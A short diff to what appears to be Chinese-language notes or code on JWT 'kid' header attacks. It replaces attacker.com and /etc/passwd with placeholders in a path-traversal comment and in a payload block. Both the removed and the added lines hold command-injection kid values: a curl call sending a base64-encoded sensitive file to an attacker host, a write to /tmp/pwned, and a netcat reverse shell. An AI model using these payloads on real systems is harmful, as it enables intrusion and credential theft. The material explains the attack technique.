@@ -66,7 +66,7 @@ def forge_with_kid_path_traversal(
     # 根据目标文件的内容确定密钥
     # /dev/null    → 密钥 = b""
     # /proc/sys/kernel/random/boot_id → 密钥 = UUID 字符串
-    # ../../etc/passwd → 大概率不匹配（需先读内容）
+    # ../..<sensitive-file> → 大概率不匹配（需先读内容）
 
     key = b""  # /dev/null 的内容为空
 
@@ -220,9 +220,9 @@ def get_key_by_kid(kid: str) -> bytes:
 ### 攻击 Payload
 
 ```json
-{"alg": "HS256", "typ": "JWT", "kid": "x;curl http://attacker.com/$(cat /etc/passwd|base64);"}
+{"alg": "HS256", "typ": "JWT", "kid": "x;curl http://<attacker-domain>/$(cat <sensitive-file>|base64);"}
 {"alg": "HS256", "typ": "JWT", "kid": "$(id>/tmp/pwned)"}
-{"alg": "HS256", "typ": "JWT", "kid": "`nc attacker.com 4444 -e /bin/bash`"}
+{"alg": "HS256", "typ": "JWT", "kid": "`nc <attacker-domain> 4444 -e /bin/bash`"}
 ```
 
 ---
